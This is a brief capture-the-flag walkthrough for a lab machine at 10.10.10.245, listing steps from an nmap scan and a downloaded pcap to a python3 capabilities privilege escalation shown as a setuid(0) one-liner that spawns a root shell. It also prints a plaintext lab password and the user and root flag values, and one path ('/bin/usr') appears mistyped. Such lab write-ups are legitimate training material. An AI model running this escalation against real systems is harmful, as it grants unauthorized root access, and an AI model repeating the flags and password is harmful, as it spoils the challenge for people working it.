# very brief walkthrough

1. do nmap scans to see that there is a website
2. go to http://10.10.10.245/data/0 and download the pcap
3. get creds for FTP / SSH to get user.txt
4. abuse python capabilities to escalate privileges to root

```bash
getcap -r / 2>/dev/null
cd /bin/usr
./python3 -c 'import os; os.setuid(0); os.system("/bin/bash")'
```

Credentials:

* Nathan
  * `nathan:Buck3tH4TF0RM3!`

Flags

* user.txt - `e17cec9a7e997ded046f699fd9fe8aaf`
* root.txt - `7511e2080552c8a781de7561f2dbf26f`